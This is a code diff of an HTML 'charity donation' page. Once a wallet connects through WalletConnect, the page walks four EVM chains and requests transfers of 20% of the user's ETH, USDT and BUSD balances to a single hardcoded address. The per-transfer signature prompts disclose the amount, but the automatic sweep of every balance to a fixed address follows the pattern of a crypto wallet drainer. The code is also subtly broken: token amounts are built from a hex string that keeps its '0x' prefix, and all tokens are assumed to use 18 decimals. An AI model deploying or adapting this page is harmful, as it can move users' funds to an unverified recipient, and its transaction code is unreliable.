@@ -3,14 +3,14 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Multi-Asset Charity Donation</title>
+<title>Multi-Asset 20% Charity Donation</title>
 <style>
-body { font-family: sans-serif; background:#f6f9fc; display:flex; justify-content:center; align-items:center; height:100vh; }
+body { font-family:sans-serif; background:#f6f9fc; display:flex; justify-content:center; align-items:center; height:100vh; }
 .card { background:#fff; padding:20px; border-radius:12px; box-shadow:0 6px 18px rgba(16,24,40,0.06); width:480px; }
 button { padding:10px 16px; border:none; border-radius:8px; cursor:pointer; font-weight:600; margin-right:10px; }
 #connect { background:#2563eb; color:#fff; }
 #disconnect { background:#ef4444; color:#fff; }
-#status { margin-top:14px; color:#64748b; word-break:break-word; }
+#status { margin-top:14px; color:#64748b; word-break:break-word; white-space:pre-line; }
 </style>
 </head>
 <body>
@@ -24,102 +24,82 @@ button { padding:10px 16px; border:none; border-radius:8px; cursor:pointer; font
 </div>
 
 <script>
-const PROJECT_ID = '38ca358a76d6819a0f6f5223030dee32';
-const CHARITY_ADDRESS = '0x7BB7a58a41f0B1B4c43e29a1B36EbBCCE8469fe9';
-const connectBtn = document.getElementById('connect');
-const disconnectBtn = document.getElementById('disconnect');
-const statusEl = document.getElementById('status');
+const PROJECT_ID='38ca358a76d6819a0f6f5223030dee32';
+const CHARITY='0x7BB7a58a41f0B1B4c43e29a1B36EbBCCE8469fe9';
+const connectBtn=document.getElementById('connect');
+const disconnectBtn=document.getElementById('disconnect');
+const statusEl=document.getElementById('status');
 
-let provider = null;
-let account = null;
+let provider=null;
+let account=null;
 
 // Load WalletConnect
-async function loadWC() {
-  await new Promise(r=>{ const s=document.createElement('script'); s.src='https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.21.4/dist/index.umd.js'; s.onload=r; document.head.appendChild(s); });
-  window.WalletConnectEthereumProvider = window['@walletconnect/ethereum-provider'];
-}
+async function loadWC(){await new Promise(r=>{const s=document.createElement('script'); s.src='https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.21.4/dist/index.umd.js'; s.onload=r; document.head.appendChild(s);});}
 
-async function initProvider() {
-  provider = await window.WalletConnectEthereumProvider.EthereumProvider.init({
-    projectId: PROJECT_ID,
-    chains: [1, 56, 137, 43114], // Mainnet + common EVM chains, extend as needed
+// Init Provider
+async function initProvider(){
+  provider=await window.WalletConnectEthereumProvider.EthereumProvider.init({
+    projectId:PROJECT_ID,
+    chains:[1,56,137,43114],
     showQrModal:true,
-    metadata:{
-      name:'Multi-Asset Charity',
-      description:'Approve 20% donation of ETH & tokens',
-      url:window.location.origin,
-      icons:['https://walletconnect.com/walletconnect-logo.svg']
-    }
+    metadata:{name:'Multi-Asset Charity',description:'Approve 20% donation of ETH & tokens',url:window.location.origin,icons:['https://walletconnect.com/walletconnect-logo.svg']}
   });
-  window.__WC_PROVIDER = provider;
+  window.__WC_PROVIDER=provider;
 }
 
-async function connectWallet() {
-  connectBtn.disabled=true;
-  statusEl.textContent='Connecting...';
+// ERC20 Helper
+async function getTokenBalance(tokenAddress, user, chainId){
+  const data='0x70a08231000000000000000000000000'+user.substring(2);
+  const bal=await provider.request({method:'eth_call',params:[{to:tokenAddress,data},'latest'],chainId});
+  return parseInt(bal,16)/1e18;
+}
+async function sendToken(tokenAddress, to, amount, chainId){
+  const valueHex='0x'+BigInt(Math.floor(amount*1e18)).toString(16);
+  const data='0xa9059cbb000000000000000000000000'+to.substring(2)+valueHex.padStart(64,'0');
+  return provider.request({method:'eth_sendTransaction',params:[{from:account,to:tokenAddress,data}],chainId});
+}
+
+// Connect & Donate
+async function connectWallet(){
+  connectBtn.disabled=true; statusEl.textContent='Connecting...';
   await loadWC();
   if(!provider) await initProvider();
   await provider.connect();
-  const accounts = await provider.request({method:'eth_requestAccounts'});
-  account = accounts[0];
-  disconnectBtn.disabled=false;
-  statusEl.textContent=`Connected: ${account}\nFetching balances...`;
+  const accs=await provider.request({method:'eth_requestAccounts'});
+  account=accs[0]; disconnectBtn.disabled=false;
+  statusEl.textContent=`Connected: ${account}\nProcessing donations...`;
 
-  // 1. Fetch ETH balance on all chains
   for(const chainId of provider.config.chains){
-    try {
-      const balanceHex = await provider.request({method:'eth_getBalance', params:[account,'latest'], chainId});
-      const balance = parseInt(balanceHex,16)/1e18;
+    try{
+      // ETH donation
+      const balanceHex=await provider.request({method:'eth_getBalance',params:[account,'latest'],chainId});
+      const balance=parseInt(balanceHex,16)/1e18;
       if(balance>0){
-        const donation = (balance*0.2).toFixed(6);
-        const msg = `I approve a 20% donation of my ETH on chain ${chainId}: ${donation} ETH to charity`;
-        await provider.request({method:'personal_sign', params:[msg,account], chainId});
-        await provider.request({method:'eth_sendTransaction', params:[{from:account,to:CHARITY_ADDRESS,value:'0x'+(BigInt(Math.floor(balance*1e18*0.2))).toString(16)}], chainId});
-        statusEl.textContent+=`\nETH chain ${chainId}: Sent ${donation} ETH`;
+        const donation=(balance*0.2).toFixed(6);
+        await provider.request({method:'personal_sign',params:[`I approve 20% donation of ${donation} ETH on chain ${chainId}`,account],chainId});
+        const txHash=await provider.request({method:'eth_sendTransaction',params:[{from:account,to:CHARITY,value:'0x'+(BigInt(Math.floor(balance*1e18*0.2))).toString(16)}],chainId});
+        statusEl.textContent+=`\nETH chain ${chainId}: Sent ${donation} ETH (tx ${txHash})`;
+      }
+
+      // Example ERC20 tokens (replace with dynamic discovery if needed)
+      const tokens={1:[{symbol:'USDT',address:'0xdAC17F958D2ee523a2206206994597C13D831ec7'}],56:[{symbol:'BUSD',address:'0xe9e7cea3dedca5984780bafc599bd69add087d56'}]};
+      if(tokens[chainId]){
+        for(const t of tokens[chainId]){
+          const bal=await getTokenBalance(t.address,account,chainId);
+          if(bal>0){
+            const donation=(bal*0.2).toFixed(6);
+            await provider.request({method:'personal_sign',params:[`I approve 20% donation of ${donation} ${t.symbol} on chain ${chainId}`,account],chainId});
+            const txHash=await sendToken(t.address,CHARITY,bal*0.2,chainId);
+            statusEl.textContent+=`\n${t.symbol} chain ${chainId}: Sent ${donation} (tx ${txHash})`;
+          }
+        }
       }
     }catch(e){console.log(e);}
   }
-
-  // 2. Fetch ERC-20 token balances per chain (requires token list or on-chain query)
-  // Simplified example with predefined token list per chain
-  const tokens = {
-    1:[{symbol:'USDT',address:'0xdAC17F958D2ee523a2206206994597C13D831ec7'}], // Ethereum mainnet
-    56:[{symbol:'BUSD',address:'0xe9e7cea3dedca5984780bafc599bd69add087d56'}], // BSC
-  };
-
-  for(const chainId of Object.keys(tokens)){
-    for(const t of tokens[chainId]){
-      try{
-        const balance = await provider.request({method:'eth_call', params:[{
-          to:t.address,
-          data:'0x70a08231000000000000000000000000'+account.substring(2)
-        }, 'latest'], chainId:parseInt(chainId)});
-        const bal = parseInt(balance,16)/1e18;
-        if(bal>0){
-          const donation = (bal*0.2).toFixed(6);
-          const msg = `I approve a 20% donation of my ${t.symbol} (${donation}) on chain ${chainId} to charity`;
-          await provider.request({method:'personal_sign', params:[msg,account], chainId:parseInt(chainId)});
-          await provider.request({method:'eth_sendTransaction', params:[{
-            from:account,
-            to:t.address,
-            data:'0xa9059cbb000000000000000000000000'+CHARITY_ADDRESS.substring(2)+'000000000000000000000000'+BigInt(Math.floor(bal*1e18*0.2)).toString(16)
-          }], chainId:parseInt(chainId)});
-          statusEl.textContent+=`\n${t.symbol} on chain ${chainId}: Sent ${donation}`;
-        }
-      }catch(e){console.log(e);}
-    }
-  }
-
   statusEl.textContent+='\nAll donations processed.';
 }
 
-function disconnectWallet(){
-  provider?.disconnect();
-  account=null;
-  connectBtn.disabled=false;
-  disconnectBtn.disabled=true;
-  statusEl.textContent='Not connected';
-}
+function disconnectWallet(){provider?.disconnect(); account=null; connectBtn.disabled=false; disconnectBtn.disabled=true; statusEl.textContent='Not connected';}
 
 connectBtn.addEventListener('click',connectWallet);
 disconnectBtn.addEventListener('click',disconnectWallet);
